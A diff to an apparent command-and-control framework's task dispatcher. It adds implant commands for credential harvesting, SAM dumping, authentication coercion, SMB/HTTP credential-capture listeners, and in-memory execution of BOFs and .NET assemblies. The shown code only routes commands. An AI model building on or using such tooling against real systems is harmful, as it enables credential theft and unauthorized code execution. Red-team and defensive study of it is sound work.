@@ -83,6 +83,40 @@ def _build_task(session: Session, command: str, cmd_id: str,
     if command.startswith("TIMESTOMP_SET:"):
         parts = command[14:].split(":", 1)
         return _bt("timestomp_set", {"target": parts[0], "timestamp": parts[1] if len(parts) > 1 else ""})
+    if command == "CREDS_HARVEST":
+        return _bt("creds_harvest", {})
+    if command == "CREDS_COERCE":
+        return _bt("creds_coerce", {})
+    if command == "CREDS_SAM":
+        return _bt("creds_sam", {})
+    if command.startswith("CREDS_LISTEN_START"):
+        proto = "smb"
+        port = 445
+        parts = command.split(":")
+        if len(parts) >= 2:
+            # Format: CREDS_LISTEN_START:proto:port  (e.g. CREDS_LISTEN_START:http:80)
+            proto = parts[1] if parts[1] in ("smb", "http") else "smb"
+        if len(parts) >= 3:
+            try: port = int(parts[2])
+            except ValueError: pass
+        return _bt("creds_listen_start", {"port": port, "proto": proto})
+    if command.startswith("CREDS_LISTEN_STOP"):
+        spec = ""
+        parts = command.split(":", 1)
+        if len(parts) >= 2 and parts[1]:
+            spec = parts[1]
+        return _bt("creds_listen_stop", {"spec": spec})
+    if command == "CREDS_LISTEN_DUMP":
+        return _bt("creds_listen_dump", {})
+    if command.startswith("BOF_EXEC:"):
+        parts = command[9:].split(":", 1)
+        return _bt("bof_exec", {"staging_path": parts[0], "args": parts[1] if len(parts) > 1 else ""})
+    if command.startswith("ASSEMBLY_EXEC:"):
+        parts = command[14:].split(":", 1)
+        return _bt("assembly_exec", {"staging_path": parts[0], "args": parts[1] if len(parts) > 1 else ""})
+    if command.startswith("MEMEXEC:"):
+        parts = command[8:].split(":", 1)
+        return _bt("memexec", {"staging_path": parts[0], "args": parts[1] if len(parts) > 1 else ""})
     if command.startswith("BLOBSAVE:"):
         parts = command[9:].split(":", 2)
         return _bt("blobsave", {
